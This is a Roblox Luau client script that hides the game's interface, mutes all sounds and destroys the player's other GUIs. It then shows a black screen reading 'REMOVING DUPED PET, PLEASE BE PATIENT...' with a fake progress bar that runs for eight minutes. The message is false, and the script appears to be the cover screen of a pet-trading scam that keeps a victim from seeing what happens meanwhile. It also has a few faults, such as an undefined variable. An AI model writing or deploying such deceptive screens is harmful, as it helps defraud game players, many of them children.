local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- Disable all core UI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Stop and mute all sounds
for _, sound in ipairs(game:GetDescendants()) do
	if sound:IsA("Sound") then
		sound:Stop()
		sound.Volume = 0
	end
end

-- Remove other GUIs
for _, gui in ipairs(player:WaitForChild("PlayerGui"):GetChildren()) do
	if not gui:IsA("ScreenGui") or gui.Name ~= "BanWarningScreen" or gui ~= loadingGui then
		gui:Destroy()
	end
end

-- Create screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Name = "LoadingScreen"
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Full black background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = screenGui

-- Top message (uppercase, slightly higher)
local topText = Instance.new("TextLabel")
topText.Text = "REMOVING DUPED PET, PLEASE BE PATIENT..."
topText.Font = Enum.Font.SourceSansBold
topText.TextSize = 20
topText.TextColor3 = Color3.fromRGB(255, 255, 255)
topText.BackgroundTransparency = 1
topText.Size = UDim2.new(1, 0, 0, 30)
topText.Position = UDim2.new(0, 0, 0.40, 0) -- slightly higher
topText.TextScaled = false
topText.TextWrapped = true
topText.Parent = bg

-- Progress bar background (slightly lower + slightly larger)
local barBG = Instance.new("Frame")
barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBG.Size = UDim2.new(0.5, 0, 0.03, 0) -- taller (was 0.02)
barBG.Position = UDim2.new(0.25, 0, 0.485, 0) -- moved slightly lower
barBG.BorderSizePixel = 0
barBG.Parent = bg

-- Progress bar fill
local barFill = Instance.new("Frame")
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BorderSizePixel = 0
barFill.Parent = barBG

-- Percentage text (same position)
local percentText = Instance.new("TextLabel")
percentText.Text = "LOADING... 0%"
percentText.Font = Enum.Font.SourceSansBold
percentText.TextSize = 20
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 0, 30)
percentText.Position = UDim2.new(0, 0, 0.525, 0)
percentText.TextScaled = false
percentText.TextWrapped = true
percentText.Parent = bg

local totalTime = 480
local steps = 100
local delayPerStep = totalTime / steps 

-- Loading loop
for i = 0, steps do
	barFill.Size = UDim2.new(i / steps, 0, 1, 0)
	percentText.Text = "LOADING... " .. i .. "%"
	wait(delayPerStep)
end

-- Cleanup
screenGui:Destroy()

-- Re-enable default Roblox UI (CoreGui)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)

-- Restore all sounds
for _, sound in ipairs(game:GetDescendants()) do
	if sound:IsA("Sound") then
		sound:Stop()
		sound.Volume = 1
	end
end

-- Re-enable all GUIs
for _, gui in ipairs(player.PlayerGui:GetChildren()) do
	gui.Enabled = true
end
